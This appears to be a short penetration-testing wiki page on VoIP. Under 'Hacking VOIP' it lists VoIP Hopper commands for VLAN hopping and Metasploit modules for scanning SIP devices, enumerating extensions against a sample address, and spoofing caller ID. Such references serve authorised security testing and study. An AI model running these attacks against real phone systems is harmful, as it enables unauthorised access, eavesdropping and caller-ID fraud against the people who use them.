# VOIP


[Wikipedia - Voice Over IP (VOIP)](https://en.wikipedia.org/wiki/Voice_over_IP) *"Voice over Internet Protocol ([VoIP](https://en.wikipedia.org/wiki/Voice_over_IP#cite_note-2)), also called IP telephony, is a method and group of technologies for [voice calls](https://en.wikipedia.org/wiki/Voice_call "Voice call") for the delivery of [voice communication](https://en.wikipedia.org/wiki/Speech "Speech") sessions over [Internet Protocol](https://en.wikipedia.org/wiki/Internet_Protocol "Internet Protocol") [(IP) networks](https://en.wikipedia.org/wiki/Voice_over_IP#cite_note-Arora_2023_t525-3), such as the [Internet](https://en.wikipedia.org/wiki/Internet "Internet").


[OlivierLaflamme/Cheatsheet-God - Cheatsheet_VOIP.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_VOIP.txt) is the initial starting point for this page, but `SIP != VOIP`, [[SIP]] summarised from [SIP.us sip vs voip article](https://www.sip.us/blog/latest-news/sip-vs-voip-whats-difference/) is the a [Network Protocol]([Network-Protocols]); [[VOIP]] is one of many [[Network-Technologies]] a business may use for human-human communication, and it may use [[SIP]].


## Hacking VOIP

May require techniques from the [[SIP]] page. Directly related VOIP exploitation is detailed below.
#### VLAN Hopping
```bash
modprobe 8021q
```
VoIP Hopper mirrored in [[VOIP]]
```bash
./voiphopper -i eth0 -c 0
./voiphopper -i eth0 -v 20
```

#### Attacking VoIP Using Metasploit 

Mirrored in [[SIP]]

Scanning SIP Enabled Devices
```ruby
use auxiliary/scanner/sip/options
```
Enumerating SIP extensions / Usernames
```ruby
use scanner/sip/enumerator
set RHOSTS 192.168.1.104
set MINEXT 100
set MAXEXT 500
set PADLEN 3
```

Spoofing Caller ID auxiliary
```ruby
use voip/sip_invite_spoof
```

## References

[OlivierLaflamme/Cheatsheet-God - Cheatsheet_VOIP.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_VOIP.txt)
[Wikipedia - Voice Over IP (VOIP)](https://en.wikipedia.org/wiki/Voice_over_IP)
[SIP.us sip vs voip article](https://www.sip.us/blog/latest-news/sip-vs-voip-whats-difference/)